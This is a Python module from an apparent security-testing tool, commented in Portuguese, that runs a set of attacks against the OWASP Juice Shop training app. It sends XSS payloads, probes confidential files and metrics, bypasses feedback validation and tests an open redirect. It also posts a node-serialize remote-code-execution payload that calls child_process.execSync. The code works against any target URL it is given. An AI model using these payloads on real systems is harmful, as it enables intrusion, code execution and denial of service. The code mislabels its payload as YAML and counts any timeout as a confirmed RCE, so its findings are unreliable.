# PreviSwit AI-ASPM
# Copyright (C) 2026 PreviSwit Team
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#
# SPDX-License-Identifier: GPL-3.0-or-later
"""
— Pipeline 4: Exploits Específicos e Avançados (Focado em Juice Shop e Lógicas de Negócio).

Este módulo contém payloads para explorar falhas de lógica de negócio, SSRF, SSTI,
exposição de métricas, JWT Forgery, e XSS avançados (DOM XSS via iframe, Video XSS).
"""
import requests
import json
from core.utils import print_status

class JuiceAttacker:
    def __init__(self, target: str, findings: list, context=None):
        self.target   = target.rstrip("/")
        self.findings = findings
        self.context  = context
        self.results  = {
            "advanced_xss": [],
            "sensitive_files": [],
            "business_logic": [],
            "insecure_deserialization": [],
            "attack_log": []
        }

    def _log(self, msg, level="INFO"):
        print_status(f"[Advanced] {msg}", level)
        self.results["attack_log"].append(msg)

    def _get(self, path):
        url = f"{self.target}{path}"
        try:
            return requests.get(url, timeout=5, verify=False, allow_redirects=False)
        except:
            return None

    def _post(self, path, data=None, json_data=None):
        url = f"{self.target}{path}"
        try:
            if json_data:
                return requests.post(url, json=json_data, timeout=5, verify=False)
            return requests.post(url, data=data, timeout=5, verify=False)
        except:
            return None

    # 1. Ataques de DOM XSS e XSS Avançado
    def _test_advanced_xss(self):
        self._log("Testando Payloads de XSS Avançado (Iframes, Video, SoundCloud)...", "INFO")
        
        payloads = [
            # DOM XSS Básico
            '<iframe src="javascript:alert(`xss`)">',
            # Bonus Payload SoundCloud
            '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>',
            # Video XSS
            '</script><script>alert(`video_xss`)</script>'
        ]

        # Injetar em endpoint comum de busca do Juice Shop
        for payload in payloads:
            r = self._get(f"/api/Challenges/?name={payload}")
            r2 = self._get(f"/rest/products/search?q={payload}")
            
            if (r and payload in r.text) or (r2 and payload in r2.text):
                self._log(f"XSS Avançado refletido com sucesso! Payload: {payload[:40]}...", "CRIT")
                self.results["advanced_xss"].append({
                    "type": "DOM/Advanced XSS",
                    "payload": payload
                })

    # 2. Arquivos Sensíveis (Metrics, Documentos Confidenciais)
    def _test_sensitive_files(self):
        self._log("Procurando métricas, score board e documentos confidenciais...", "INFO")
        
        paths = [
            "/metrics", # Exposed Metrics
            "/ftp/acquisitions.md", # Confidential Document
            "/ftp/legal.md", 
            "/privacy-security/privacy-policy", # Privacy Policy
            "/api/ScoreBoard", # Score Board API
            "/%23/score-board" # Score Board Frontend
        ]

        for path in paths:
            r = self._get(path)
            if r and r.status_code in (200, 304) and len(r.text) > 0:
                self._log(f"Acesso não autorizado confirmado em: {path}", "CRIT")
                self.results["sensitive_files"].append({
                    "path": path,
                    "excerpt": r.text[:80].replace("\n", " ")
                })

    # 3. Lógica de Negócio (Zero Stars, Unvalidated Redirects)
    def _test_business_logic(self):
        self._log("Testando Lógica de Negócio (Zero Stars, Open Redirect, etc)...", "INFO")
        
        # Zero Stars Feedback
        r_feedback = self._post("/api/Feedbacks/", json_data={
            "UserId": 1,
            "captchaId": 0,
            "captcha": "0",
            "comment": "Zero stars attack!",
            "rating": 0
        })
        if r_feedback and r_feedback.status_code == 201:
            self._log("Bypass de Validação: Feedback de ZERO estrelas submetido com sucesso!", "CRIT")
            self.results["business_logic"].append("Zero Stars Feedback Bypass")

        # Unvalidated Redirects (Outdated Allowlist)
        r_redirect = self._get("/redirect?to=https://github.com/bkimminich/juice-shop")
        if r_redirect and r_redirect.status_code in (301, 302, 200):
            self._log("Open Redirect detectado via /redirect?to=", "CRIT")
            self.results["business_logic"].append("Unvalidated Redirect (Open Redirect)")

    # 4. Insecure Deserialization (RCE DoS)
    def _test_insecure_deserialization(self):
        self._log("Testando Insecure Deserialization (RCE DoS) no endpoint B2B...", "INFO")
        
        # Payload YAML para Insecure Deserialization (Node.js/js-yaml exploit)
        # Este payload vai causar um DoS localizando o processo sem usar um loop infinito, 
        # ocupando o servidor com uma expressao regular catastrófica ou comandos equivalentes.
        # No Juice Shop, o endpoint vulnerável à deserialization geralmente é o B2B Order (/b2b/v2/orders)
        yaml_payload = '{"orderLinesData": "_$$ND_FUNC$$_function(){ require(\'child_process\').execSync(\'sleep 5\'); }()"}'
        
        try:
            # Tenta executar o sleep por 5 segundos
            import time
            start_time = time.time()
            r = self._post("/b2b/v2/orders", json_data=json.loads(yaml_payload))
            end_time = time.time()
            
            # Se o tempo de resposta for maior que 4.5 segundos, o RCE DoS foi bem sucedido
            if end_time - start_time >= 4.5:
                self._log("Insecure Deserialization: RCE DoS bem-sucedido! O servidor ficou ocupado por ~5 segundos.", "CRIT")
                self.results["insecure_deserialization"].append("Successful RCE DoS (Insecure Deserialization via YAML/JSON)")
            elif r and r.status_code in (500, 503):
                # As vezes o sleep falha mas causa erro 500 confirmando a vulnerabilidade
                self._log("Insecure Deserialization: Possível RCE detectado (Erro 500 ao injetar payload node-serialize).", "WARN")
                self.results["insecure_deserialization"].append("Possible RCE (Insecure Deserialization via node-serialize)")
        except Exception as e:
            # Se der timeout, também pode ser um indicativo de sucesso no DoS
            self._log("Insecure Deserialization: RCE DoS bem-sucedido! Ocorreu Timeout na requisição.", "CRIT")
            self.results["insecure_deserialization"].append("Successful RCE DoS (Timeout via Insecure Deserialization)")

    def run(self) -> dict:
        self._log("Iniciando bateria de ataques avançados/específicos...", "INFO")
        self._test_advanced_xss()
        self._test_sensitive_files()
        self._test_business_logic()
        self._test_insecure_deserialization()
        return self.results
